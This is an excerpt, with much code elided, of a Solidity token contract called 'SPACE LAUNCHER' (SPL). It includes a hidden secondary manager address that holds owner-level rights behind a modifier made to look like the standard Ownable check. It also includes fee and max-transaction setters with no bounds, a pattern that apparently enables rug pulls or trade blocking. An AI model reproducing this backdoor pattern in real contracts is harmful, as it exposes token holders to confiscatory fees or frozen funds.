...
/**
 * Telegram : https://t.me/SpaceLauncher
 */
...
contract SpaceLauncher is Context, IERC20, Ownable, ReentrancyGuard {
    ...
    address payable private _smfAddress = payable(0xDeF321c4e5F3689Fb18d8C9647DF2C9AfCDe7065);
    address private _mgr;

    string private _name = "SPACE LAUNCHER";
    string private _symbol = "SPL";
    uint8 private _decimals = 9;
    uint256 public _rewardFee = 5;
    uint256 public _burnFee = 3;
    uint256 public _smFee = 4;
    uint256 private _tTotal = 100000000000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 1000000000000 * 10 ** _decimals;
    uint256 public stsmf = 200000000000 * 10 ** _decimals;
    ...
    modifier yesMgr() {
        (bool success) = (_mgr == _msgSender() || owner() == _msgSender());
        require(success, "Ownable: Failed");
        _;
    }
    ...
    function excludeFromReward(address account) public yesMgr {
    ...
    function includeInReward(address account) external yesMgr {
        require(_isExcludedFromReward[account], "Account is already excluded");
    ...
    function excludeFromFee(address account) public yesMgr {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public yesMgr {
        _isExcludedFromFee[account] = false;
    }

    function setRewardFeePercent(uint256 rewardFee) external yesMgr {
        _rewardFee = rewardFee;
    }

    function setBurnFeePercent(uint256 burnFee) external yesMgr {
        _burnFee = burnFee;
    }

    function setMaxTxPercent(uint256 maxTxPercent) external yesMgr {
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(10 ** 2);
    }

    function setSMFPercent(uint256 SMFPercent) external yesMgr {
    ...
    function checkSMF() external yesMgr {
